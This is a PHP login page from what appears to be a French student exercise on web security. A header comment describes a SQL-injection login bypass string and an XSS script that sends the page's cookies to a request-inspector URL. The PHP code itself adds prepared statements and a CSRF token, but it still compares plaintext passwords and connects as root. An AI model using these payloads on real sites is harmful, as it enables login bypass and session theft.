<!--   Injection SQL:

Pour faire l'injection SQL j'ai simplement entrer 'OR 1=1 OR 1=' puis j'ai passer le login. La commande modifie la requête SQL du code 
et permet de "bypass" le login
Pour s'en proteger j'ai utilisé htmlspecialchars et des requêtes préparé.
Pour plus de sécurité j'ai ajouter des required aux champs username et password.

_________________________________________________________________________________________________________________________________________

Attaque XSS:

Pour l'attaque XSS, j'ai utlisé le site request inspector, qui ecoute les requêtes envoyé par notre page web. 
J'ai rentrer ce Script dans l'identifiant en ecrivant le liens de la page que me donne request inspector, à la place de LIENPAGE: 
    <script>document.write('<img src="LIENPAGE?cookie=' + document.cookie + '" width=0 height=0 border=0 />');</script>
Et ensuite j'ai pu récuperer les cookies grâce au retour de request inspector
Pour s'en proteger j'ai utilisé htmlspecialchars et des requêtes préparé.
Pour plus de sécurité j'ai ajouter des required aux champs username et password.

_________________________________________________________________________________________________________________________________________
_
Attaque CSRF

Pour empêcher les attaques CSRF, j'ai ajouter des jetons de connection qui permettent de verifier la connection en plus des cookies.

__________________________________________________________________________________________________________________________________________

Attaque RFI

Voir fichier attaqueRFI qui permet de print toutes les variables defini.  -->

<?php
session_start();

# Générer et stocker le jeton CSRF dans la session
if (!isset($_SESSION['csrf_jeton'])) {
    $_SESSION['csrf_jeton'] = bin2hex(random_bytes(32));
}

if(isset($_POST['signin'])){
    # Vérifier si le jeton CSRF est présent dans la requête
    if (!isset($_POST['csrf_jeton']) || $_POST['csrf_jeton'] !== $_SESSION['csrf_jeton']) {
        die("Erreur de sécurité : Jeton CSRF invalide.");
    }

    $pdo = new PDO("mysql:host=localhost;dbname=db_exo_login", 'root', '');
    #Utilisation de la fonction htmlspecialchars pour empêcher l'utilisareur de rentrer des charactère qui permettrais de modifier le fonctionnement du code (SQL, XSS)
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    #Requête préparé pour protéger des attaques (SQL, XSS)
    $stmt = $pdo->prepare("SELECT * FROM user WHERE username=:username AND password=:password");
    $stmt->execute(array(':username' => $username, ':password' => $password));
    $result = $stmt->fetch();
    
    if ($result){
        echo 'connexion réussie';
        header('Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ');
        exit();
    } else {
        echo 'utilisateur non reconnu';
    }
}

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="style.css" type="text/css" rel="stylesheet">
    <title>Exercice login</title>
</head>
<body>
    <div id="formulaire">
        <form method="POST">
            <h1>Connection</h1>  
            <label>Identifiant</label>
            <br>
            <!-- Ajout de required pour plus sécurité -->
            <input type="text" name= "username" required></input>
            <br>
            <label>Mot de passe</label>
            <br>
            <input type="password" name="password" required></input>
            <br>
            <!-- Ajoutez un champ caché pour le jeton CSRF -->
            <input type="hidden" name="csrf_jeton" value="<?php echo $_SESSION['csrf_jeton']; ?>">

            <input type="submit" value="Se connecter" name="signin"/>
        </form>
    </div>
</body>
</html>



